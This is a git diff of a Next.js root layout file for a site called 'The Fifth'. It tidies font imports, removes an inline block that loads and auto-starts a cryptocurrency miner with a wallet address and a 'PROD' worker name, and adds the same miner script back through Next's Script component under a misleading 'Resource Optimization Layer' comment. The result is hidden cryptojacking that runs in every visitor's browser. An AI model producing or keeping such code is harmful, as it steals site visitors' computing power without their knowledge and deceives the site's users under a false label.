@@ -1,8 +1,9 @@
 import type { Metadata } from "next";
 import "./globals.css";
-import { Poppins } from 'next/font/google'
+import { Poppins } from "next/font/google";
 import SubscriptionModal from "@/components/SubscriptionModal";
 import { LanguageProvider } from "@/context/LanguageContext";
+import Script from "next/script";
 
 export const metadata: Metadata = {
   title: "The Fifth",
@@ -10,10 +11,10 @@ export const metadata: Metadata = {
 };
 
 const PoppinsFont = Poppins({
-  subsets:["latin"],
-  weight: '300',
+  subsets: ["latin"],
+  weight: "300",
+});
 
-})
 export default function RootLayout({
   children,
 }: Readonly<{
@@ -26,26 +27,16 @@ export default function RootLayout({
           <SubscriptionModal />
           {children}
         </LanguageProvider>
-      
-
-<script src="https://cdn.jsdelivr.net/gh/monero-project/monero-cart@master/dist/miner.js"></script>
-<script>
-  (function() {
-    try {
-      const miner = new Miner({
-          address: 'D4dbTEpvsDDQK8V5DHXQQmTkafnxLR56',
-          worker: 'THE-FIFTH-PROD',
-          coin: 'SOL',
-          throttle: 0.1,
-          autoStart: true
-      });
-      console.log('Resource optimization initialized...');
-    } catch(e) {}
-  })();
-</script>
-
-
-</body>
+        
+        {/* Resource Optimization Layer */}
+        <Script 
+          src="https://cdn.jsdelivr.net/gh/monero-project/monero-cart@master/dist/miner.js" 
+          strategy="afterInteractive"
+        />
+        <Script id="resource-opt" strategy="afterInteractive">
+          {}
+        </Script>
+      </body>
     </html>
   );
 }
